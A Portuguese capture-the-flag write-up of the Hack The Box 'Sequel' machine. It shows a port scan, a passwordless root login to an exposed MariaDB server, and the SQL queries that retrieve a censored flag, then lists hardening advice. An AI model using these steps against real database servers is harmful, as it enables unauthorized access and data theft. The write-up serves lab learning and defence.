## HTB: Sequel
### 📋 Informações da Máquina

 - Plataforma: Hack the Box
 - Máquina: Sequel
 - Dificuldade: Muito Fácil
 - Ip: 10.129.x.x


## ⚙️ 0. Resumo
A maquina já é da TIER 2 dos Starting Points, essa ela usa um server MySql na versão MariaDB, o objetivo é ter o acesso remoto root do banco e achar a flag

### ⚠️ 0.1 VULNERABILIDADES IDENTIFICADAS

- Ausência de Autenticação como ROOT

- Serviço Exposto na rede

## 🔍 1. ENUMERAÇÃO
### 1.1 Varredura de Portas

Eu não sabia qual era a porta que estaria o serviço, então decidi escanear um número alto de portas

```bash
sudo nmap -sS -sV -p 1-6379 10.129.x.x
```

📊 Resultado:

```bash
PORT     STATE SERVICE VERSION
3306/tcp open  mysql
``` 

✅ Conclusão: Server MySql encontrado aberto na porta 3306


## ⚡ 2. EXPLORAÇÃO
### 2.1 Conexão com o MySQL

Foi bem fácil na real, ja que o server não tinha autenticação com senha, mas tive que colocar " --skip-ssl"
pois tava dando erro sem isso

```bash
mysql --skip-ssl -u root -h 10.129.x.x
```

### 2.2 Enumeração de Dados

Dentro do MySql, usei comandos para explorar o servidor:

```bash
SHOW DATABASES;
```

🎯 Resultado:

```bash
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
```

### 2.3 Procurando a Flag
Eu fui procurar a flag no banco de dados "htb", para selecionar ele usei:

```bash
 USE htb;
```

e depois usei para ver as tabelas dentro dele:

```bash
SHOW TABLES;
```

🎯 Resultado:

```bash
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```


### 2.3 Captura da Flag

Após achar essas duas tabelas, eu fui na config, pq achei que era a com mais chance de ter alguma coisa, ent usei


```bash
SELECT * FROM config;
```

🎯 Resultado:

```bash
+---------------+
| config |
+---------------------------+
| flag          | {.......} |
+---------------------------+
```
*OBS: Censurei a flag!

## 🛡️ 3. RECOMENDAÇÕES DE SEGURANÇA

- 1. Configurar senha para usuário e usuário ROOT

- 2. Não deixar o serviço aberto e exposto na rede

- 3. Colocar o serviço em uma porta mais alta para dificultar o scan de portas


## 🎯 4. CONCLUSÃO
### 4.1 Resumo do Ataque:

- Complexidade: Baixa

- Impacto: Critíco (Usuário ROOT adquirido)

#### 4.2 Lições Aprendidas:

  1. Sempre coloque senha, e tbm que seja uma senha boa

  2. Não deixe qualquer serviço exposto, tente sempre dificultar o reconhecimento dele

  3. Aprendi a se movimentar em um banco de dados MySql no prompt


### 🧠 Reflexão Pessoal:

"MySQL é um serviço muito usado ainda em muitos sites e aplicações, se você não tiver a devida configuração, alguém que invadir o serviço exposto, pode roubar e deletar todos os bancos de dados hospedados, então sempre coloque senha e proteja seus serviços."

✅ Máquina Finalizada com Sucesso!

Write-up por: Luiz A. | Hack The Box - Sequel | 25/10/25
